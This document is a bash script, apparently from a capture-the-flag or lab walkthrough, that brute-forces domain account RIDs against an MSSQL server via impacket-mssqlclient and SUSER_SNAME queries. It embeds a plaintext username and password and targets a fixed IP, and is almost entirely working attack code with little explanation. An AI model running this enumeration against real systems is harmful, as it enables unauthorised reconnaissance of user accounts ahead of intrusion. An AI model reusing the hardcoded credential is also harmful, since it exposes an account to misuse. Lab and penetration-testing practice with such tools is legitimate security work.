Change the credentials:
```BASH
#!/usr/bin/env bash
set -euo pipefail

# Usage: ./sider.sh <SID_HEX_OR_RAW_OUTPUT>
# Example: ./sider.sh "b'0105000000000005150000005b7bb0f398aa2245ad4a1ca400020000'"

if [ $# -lt 1 ]; then
  echo "Usage: $0 <SID_HEX_OR_RAW_OUTPUT>"
  exit 1
fi

RAW="$1"

# Clean the input: remove b'...' wrapper, optional 0x prefix, non-hex chars
SID_HEX=$(echo -n "$RAW" | tr -d '\n\r ' | sed -E "s/^b'([0-9A-Fa-f]+)'\$/'\\1'/; s/^b'//; s/'$//; s/^0x//")

# If still contains non-hex, remove them (safety)
SID_HEX=$(echo -n "$SID_HEX" | tr -cd '0-9A-Fa-f')

# Validate length
if [ "${#SID_HEX}" -lt 8 ]; then
  echo "SID hex looks too short: '$SID_HEX'"
  exit 1
fi

# Remove the last 4 bytes (8 hex chars) to get the SID base
SID_BASE=${SID_HEX:0:$((${#SID_HEX} - 8))}
if [ -z "$SID_BASE" ]; then
  echo "Failed to determine SID_BASE from: $SID_HEX"
  exit 1
fi

# MSSQL connection config (edit as needed)
# Range to test (edit if you want)
FROM=1800
TO=2000

echo "Using SID_BASE: $SID_BASE"
echo "Testing RIDs from $FROM to $TO..."

for RID in $(seq "$FROM" "$TO"); do
  # produce 4-byte little-endian hex for RID
  BE=$(printf "%08x" "$RID")               # big-endian hex e.g. 000003e8
  LE=$(echo "$BE" | sed -E 's/(..)(..)(..)(..)/\4\3\2\1/')  # reorder bytes
  SID="${SID_BASE}${LE}"

  # create sql temp file
  SQL_FILE=$(mktemp)
  printf 'select SUSER_SNAME(0x%s);\n' "$SID" > "$SQL_FILE"

  # run impacket-mssqlclient and capture output
  OUT=$(impacket-mssqlclient kevin:'iNa2we6haRj2gaw!'@10.10.11.95 -file "$SQL_FILE" 2>&1 || true)
  rm -f "$SQL_FILE"

  # extract the single result line after the '----' separator (if present)
  RES=$(echo "$OUT" | awk '/^----/{getline; print; exit}')

  # fallback: try to find any line that looks non-empty
  if [ -z "$RES" ]; then
    RES=$(echo "$OUT" | sed -n '1,120p' | tr '\r' '\n' | sed '/^\s*$/d' | tail -n 1)
  fi

  # print progress inline
  printf "\r%4d: %s" "$RID" "${RES:-}"

  # if result isn't empty and isn't 'NULL' then we found something
  if [ -n "$RES" ] && [ "$(echo "$RES" | xargs)" != "NULL" ]; then
    echo
    echo "FOUND for RID $RID -> ${RES}"
    # optionally exit or continue searching for more
    # exit 0
  fi
done

echo
echo "Done."
```